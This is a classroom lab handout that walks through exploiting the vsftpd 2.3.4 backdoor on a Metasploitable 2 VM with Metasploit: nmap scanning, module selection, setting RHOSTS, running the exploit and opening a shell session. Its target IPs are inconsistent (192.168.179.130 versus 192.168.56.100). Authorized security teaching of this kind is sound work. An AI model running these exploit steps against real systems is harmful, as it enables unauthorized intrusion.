# Experiment: Simulated Ethical Hacking with Metasploit

## Aim

To perform a safe and controlled exploitation of a vulnerable virtual machine using the Metasploit Framework and understand the basic procedure followed in ethical hacking.

## Requirements

- Kali Linux — attacker/security-testing machine
- Metasploitable 2 — intentionally vulnerable target VM
- VirtualBox or VMware
- Isolated Host-only/Internal Network
- Target IP: `192.168.179.130`

> **Safety:** Perform this experiment only against your intentionally vulnerable Metasploitable VM in an isolated lab network.

---

## 1. Theory

**Metasploit Framework** is a penetration-testing framework used to discover and validate vulnerabilities in controlled environments.

A basic exploitation process is:

```text
Reconnaissance
      ↓
Identify vulnerable service
      ↓
Select exploit
      ↓
Select payload
      ↓
Configure target
      ↓
Run exploit
      ↓
Verify access
      ↓
Document findings
```

---

## 2. Verify Connectivity

On Kali, check whether the target VM is reachable:

```bash
ping 192.168.56.100
```

Expected output:

```text
64 bytes from 192.168.56.100: icmp_seq=1 ttl=64 time=...
```

This confirms that Kali can communicate with the target VM.

---

## 3. Scan the Target

Use Nmap to identify running services:

```bash
nmap -sV 192.168.56.100
```

The `-sV` option attempts to identify the versions of services running on the target.

You may see services such as:

```text
21/tcp   ftp
22/tcp   ssh
23/tcp   telnet
80/tcp   http
139/tcp  netbios-ssn
445/tcp  microsoft-ds
```

**Observation:** The scan provides information that can be used to identify potentially vulnerable services.

---

## 4. Start Metasploit

Run:

```bash
msfconsole
```

Check the Metasploit version:

```text
version
```

---

## 5. Search for a Vulnerable Service

For this lab, Metasploitable 2 contains intentionally vulnerable services. A common classroom demonstration is the **vsftpd 2.3.4** backdoor vulnerability.

Search Metasploit:

```text
search vsftpd
```

You should find an exploit corresponding to:

```text
vsftpd 2.3.4 Backdoor
```

---

## 6. Select the Exploit

Select the module:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

Check its available options:

```text
show options
```

Set the target host:

```text
set RHOSTS 192.168.179.130
```

Check the configuration again:

```text
show options
```

The important value should now be:

```text
RHOSTS    192.168.179.130
```

---

## 7. Run the Exploit

Execute:

```text
run
```

or:

```text
exploit
```

Metasploit will attempt to exploit the vulnerable FTP service on the Metasploitable VM.

If successful, Metasploit may report that a session has been opened.

---

## 8. Verify the Session

Check the available sessions:

```text
sessions
```

You may see something similar to:

```text
Active sessions
===============

Id  Name  Type
--  ----  ----
1         shell ...
```

Interact with the session:

```text
sessions -i 1
```

Then execute basic identification commands:

```bash
whoami
```

and:

```bash
id
```

This demonstrates that the exploit resulted in command execution on the vulnerable lab VM.

---

## 9. Exit the Session

To leave the target session without terminating it:

```text
background
```

Then check the sessions:

```text
sessions
```

To terminate the lab session:

```text
sessions -K
```

---

## 10. Important Metasploit Commands

| Command | Purpose |
|---|---|
| `msfconsole` | Start Metasploit |
| `search <keyword>` | Search for modules |
| `use <module>` | Select a module |
| `info` | Display module information |
| `show options` | Display required options |
| `set RHOSTS <IP>` | Set target IP |
| `run` | Execute the module |
| `sessions` | List active sessions |
| `sessions -i <ID>` | Interact with a session |
| `background` | Background current session |
| `exit` | Exit Metasploit |

---

## 11. Result

The vulnerable Metasploitable virtual machine was tested using the Metasploit Framework in an isolated lab environment. The experiment demonstrated the basic ethical hacking workflow of reconnaissance, vulnerability identification, exploit selection, exploit configuration, exploitation, and session verification.

---

## 12. Precautions

1. Perform exploitation only against the intentionally vulnerable Metasploitable VM.
2. Keep Kali and Metasploitable on an isolated Host-only/Internal network.
3. Do not target public IP addresses or systems without explicit authorization.
4. Verify the target IP before executing an exploit.
5. Use the lab only for educational and authorized penetration-testing purposes.

